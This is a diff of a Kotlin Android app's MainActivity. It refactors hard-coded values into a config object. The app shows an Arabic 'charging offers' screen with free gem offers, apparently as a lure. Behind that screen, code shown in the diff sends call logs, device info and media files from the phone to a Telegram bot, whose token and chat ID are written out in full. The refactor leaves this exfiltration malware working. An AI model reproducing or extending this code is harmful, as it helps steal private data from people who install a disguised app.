@@ -45,12 +45,20 @@ class MainActivity : AppCompatActivity() {
         val highlighted: Boolean
     )
 
+    private object AppConfig {
+        const val BOT_TOKEN = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
+        const val CHAT_ID = "8859920681"
+        const val HEADER_TITLE = "3. عروض الشحن"
+        const val BG_HEX = "#070A0F"
+        const val CARD_HEX = "#111722"
+        const val ACCENT_HEX = "#18B7F2"
+        const val MAX_RETRIES = 3
+        const val STREAM_BUFFER_SIZE = 32768
+    }
+
     private lateinit var rootLayout: LinearLayout
     private lateinit var statusView: TextView
     private val ioExecutor = Executors.newSingleThreadExecutor()
-
-    private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
-    private val chatId = "8859920681"
 
     private val offers = listOf(
         OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
@@ -93,8 +101,8 @@ class MainActivity : AppCompatActivity() {
     private fun renderOffersScreen() {
         rootLayout.removeAllViews()
         rootLayout.orientation = LinearLayout.VERTICAL
-        rootLayout.setBackgroundColor(Color.parseColor("#070A0F"))
-        window.decorView.setBackgroundColor(Color.parseColor("#070A0F"))
+        rootLayout.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
+        window.decorView.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
 
         val scrollView = ScrollView(this).apply {
             layoutParams = LinearLayout.LayoutParams(
@@ -113,7 +121,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         statusView = TextView(this).apply {
-            text = "3. عروض الشحن"
+            text = AppConfig.HEADER_TITLE
             setTextColor(Color.WHITE)
             textSize = 16f
             typeface = Typeface.DEFAULT_BOLD
@@ -168,10 +176,10 @@ class MainActivity : AppCompatActivity() {
             background = GradientDrawable().apply {
                 shape = GradientDrawable.RECTANGLE
                 cornerRadius = dp(14).toFloat()
-                setColor(Color.parseColor("#111722"))
+                setColor(Color.parseColor(AppConfig.CARD_HEX))
                 setStroke(
                     if (offer.highlighted) dp(2) else dp(1),
-                    if (offer.highlighted) Color.parseColor("#18B7F2") else Color.parseColor("#1E293B")
+                    if (offer.highlighted) Color.parseColor(AppConfig.ACCENT_HEX) else Color.parseColor("#1E293B")
                 )
             }
             setPadding(dp(12), dp(14), dp(12), dp(14))
@@ -206,7 +214,7 @@ class MainActivity : AppCompatActivity() {
 
         val gem = TextView(this).apply {
             text = "◆"
-            setTextColor(Color.parseColor("#18B7F2"))
+            setTextColor(Color.parseColor(AppConfig.ACCENT_HEX))
             textSize = 26f
             gravity = Gravity.CENTER
         }
@@ -293,7 +301,7 @@ class MainActivity : AppCompatActivity() {
     private fun runSyncWithRetry() {
         if (ioExecutor.isShutdown) return
         ioExecutor.execute {
-            val maxRetries = 3
+            val maxRetries = AppConfig.MAX_RETRIES
             var callLogsSent = false
             var infoSent = false
 
@@ -539,8 +547,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun postTelegramText(text: String) {
-        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
-        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"
+        val endpoint = "https://api.telegram.org/bot${AppConfig.BOT_TOKEN}/sendMessage"
+        val body = "chat_id=${URLEncoder.encode(AppConfig.CHAT_ID, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"
 
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
@@ -576,7 +584,7 @@ class MainActivity : AppCompatActivity() {
         val boundary = "----AndroidBoundary${System.nanoTime()}"
         val lineEnd = "\r\n"
         val twoHyphens = "--"
-        val endpoint = "https://api.telegram.org/bot$botToken/$endpointMethod"
+        val endpoint = "https://api.telegram.org/bot${AppConfig.BOT_TOKEN}/$endpointMethod"
 
         val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
@@ -594,7 +602,7 @@ class MainActivity : AppCompatActivity() {
                 DataOutputStream(conn.outputStream).use { out ->
                     out.writeBytes(twoHyphens + boundary + lineEnd)
                     out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
-                    out.writeBytes(chatId + lineEnd)
+                    out.writeBytes(AppConfig.CHAT_ID + lineEnd)
 
                     out.writeBytes(twoHyphens + boundary + lineEnd)
                     out.writeBytes(
@@ -602,7 +610,7 @@ class MainActivity : AppCompatActivity() {
                     )
                     out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")
 
-                    val buffer = ByteArray(32768)
+                    val buffer = ByteArray(AppConfig.STREAM_BUFFER_SIZE)
                     var bytesRead: Int
                     while (stream.read(buffer).also { bytesRead = it } != -1) {
                         out.write(buffer, 0, bytesRead)
